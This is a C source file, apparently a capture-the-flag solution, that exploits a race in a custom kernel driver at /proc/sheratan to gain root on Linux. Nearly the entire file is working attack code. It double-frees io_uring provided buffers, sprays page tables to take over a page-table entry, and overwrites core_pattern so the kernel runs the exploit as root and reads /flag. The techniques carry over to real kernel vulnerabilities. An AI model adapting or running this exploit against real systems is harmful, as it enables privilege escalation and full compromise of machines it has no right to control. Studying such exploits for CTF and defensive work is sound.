```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <unistd.h>

#include "libs/io_uring.h"
#include "libs/pwn.h"

/*******************************
 * HELPERS                     *
 *******************************/

#define PROC_NAME "/proc/sheratan"

int init_sheratan() { return SYSCHK(open(PROC_NAME, O_RDWR)); }

void sheratan_push(int sheratan_fd, enum sheratan_cmds cmd) {
  struct sheratan_param param = {.cmd = cmd};
  SYSCHK(ioctl(sheratan_fd, SHERATAN_IOCTL_PUSH, &param));
}

enum sheratan_cmds sheratan_pop(int sheratan_fd) {
  struct sheratan_param param;
  int ret = ioctl(sheratan_fd, SHERATAN_IOCTL_POP, &param);
  if (ret < 0)
    return -1;
  return param.cmd;
}

void sheratan_done(int sheratan_fd) {
  struct sheratan_param param;
  SYSCHK(ioctl(sheratan_fd, SHERATAN_IOCTL_DONE, &param));
}

void sheratan_get_status(int sheratan_fd, struct sheratan_status *status) {
  struct sheratan_param param = {.status = status};
  SYSCHK(ioctl(sheratan_fd, SHERATAN_IOCTL_GET_STATUS, &param));
}

void sheratan_set_status(int sheratan_fd, struct sheratan_status *status) {
  struct sheratan_param param = {.status = status};
  SYSCHK(ioctl(sheratan_fd, SHERATAN_IOCTL_SET_STATUS, &param));
}

/*******************************
 * EXPLOIT                     *
 *******************************/

#define CORE_PATTERN_TARGET "|/proc/%P/fd/666 %P"
#define SHELL_CMD "cat /flag"

// target size 0x40
// divide by 8 (struct page *) size
// multiply by page size 0x1000
// divide by pbuf entry size 0x10
#define PBUF_ENTRIES ((0x40 * 0x1000) / 0x80)
#define PBUF_ENTRIES_SIZE PBUF_SIZE(PBUF_ENTRIES)
#define PBUF_SPRAY 0x80

#define N_SPRAY 0x800
#define PAGES_GAP 0x8
#define SPRAY_GAP (PAGES_GAP * 0x1000)

int bgid = 1;

void *victim(void *arg) {
  int sfd = *(int *)arg;
  set_scheduler(0, SCHED_IDLE, 0);

  enum sheratan_cmds cmd = -1;

  linfo("poping cmd");
  while (cmd == -1) {
    sched_yield();
    cmd = sheratan_pop(sfd);
  }
  linfo("popped cmd %d", cmd);
  sheratan_done(sfd);
  linfo("finished cmd");

  // reclaim dangeling ptr
  setup_provide_buffer_mmap(0, PBUF_ENTRIES);

  return NULL;
}

int check_core() {
  // Check if /proc/sys/kernel/core_pattern has been overwritten
  char buf[0x100] = {};
  int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
  SYSCHK(read(core, buf, sizeof(buf)));
  close(core);
  return strncmp(buf, CORE_PATTERN_TARGET, 0x10) == 0;
}

void crash() {
  pin_cpu(0, 1);
  setsid();
  int memfd = memfd_create("", 0);
  SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
  dup2(memfd, 666);
  close(memfd);
  while (check_core() == 0)
    usleep(100000);
  fputs(LINFO "flag: ", stdout);
  *(sz *)0 = 0;
}

void cat(char *file) {
  int fd = SYSCHK(open(file, O_RDONLY));
  char buf[0x2000];
  size_t len = read(fd, buf, sizeof(buf));
  write(STDOUT_FILENO, buf, len);
  putchar('\n');
}

void win() { CHK(system(SHELL_CMD) == EXIT_SUCCESS); }

int main(int argc, char *argv[]) {

  set_current_slab_info(0x40);

  int sfd;
  pthread_t victim_thread, hijack_thread;

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  if (argc > 1) {
    int pid = strtoull(argv[1], 0, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, STDIN_FILENO);
    dup2(stdoutfd, STDOUT_FILENO);
    dup2(stderrfd, STDERR_FILENO);
    win();
    exit(EXIT_SUCCESS);
  }

  lstage("INIT");

  if (fork() != 0)
    crash();

  pin_cpu(0, 0);
  rlimit_increase(RLIMIT_NOFILE);

  sfd = init_sheratan();
  setup_io_uring();

  u8 *spray[N_SPRAY];
  for (int i = 0; i < N_SPRAY; i++) {
    spray[i] = mmap((void *)(0xdead000000 + i * (SPRAY_GAP * 2)), SPRAY_GAP,
                    PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    CHK(spray[i] != MAP_FAILED);
  }

  lstage("RACE");

  pthread_create(&victim_thread, NULL, victim, &sfd);

  linfo("pushing ping cmd");
  sheratan_push(sfd, PING);
  linfo("ping done, start race");
  sheratan_done(sfd);
  // double free this
  setup_provide_buffer_mmap(bgid, PBUF_ENTRIES);
  linfo("race done");

  pthread_join(victim_thread, NULL);
  // 0 and bgid point to the same pages

  lstage("CORRUPT");

  // linfo("marking pages");
  u64 *pbuf = mmap_provide_buffer(0, PBUF_ENTRIES);
  lhex(pbuf);

  *pbuf = 0xdeadc0de;

  // free all but on page
  pbuf = SYSCHK(mremap(pbuf, PBUF_ENTRIES_SIZE, 0x1000, MREMAP_MAYMOVE));

  for (int i = bgid + 1; i < PBUF_SPRAY; i++)
    setup_provide_buffer_mmap(i, PBUF_ENTRIES);

  for (int i = bgid + 1; i < PBUF_SPRAY; i++)
    destroy_provide_buffer(i);

  linfo("trigger folio_put");
  // lhex(pbuf);
  destroy_provide_buffer(0);
  destroy_provide_buffer(bgid);

  linfo("spray PTEs and flush TLB");
  for (int i = 0; i < N_SPRAY; i++)
    for (int j = 0; j < PAGES_GAP; j++)
      *(u64 *)(spray[i] + j * 0x1000) = 0xdead00000000 | (i << 16) | (j);

  // prevents kernel panic on fork (for clear_tlb)
  setup_provide_buffer_mmap(0, PBUF_ENTRIES);

  linfo("checking mark");

  if (*pbuf == 0xdeadc0de)
    lerror("mark intact, exploit failed");

  print_hex(pbuf, 0x10);
  CHK((*pbuf & 0xff) == 0x43);

  lstage("DIRTY PAGETABLE");

  // core_pattern
  pbuf[0] = 0x00e800004131a043;

  flush_tlb();

  linfo("find corrupted page");
  u64 *vuln = 0;
  u64 physbase = 0;
  u8 *crpt = NULL;

  for (int i = 0; i < N_SPRAY; i++) {
    for (int j = 0; j < PAGES_GAP; j++) {
      if (*(u64 *)(spray[i] + j * 0x1000) !=
          (0xdead00000000 | (i << 16) | (j))) {
        linfo("found corrupted page at spray[%d] + 0x%lx", i, j * 0x1000);
        crpt = spray[i] + j * 0x1000;
        break;
      }
    }
    if (crpt)
      break;
  }

  if (!crpt)
    lerror("could not find corrupted page");

  u8 *core_pattern = crpt + 0x798;
  CHK(strcmp((char *)core_pattern, "core") == 0);

  lstage("EoP");
  strcpy((char *)core_pattern, CORE_PATTERN_TARGET);

  pause();

  lstage("END");
  getchar();

  return 0;
}
```
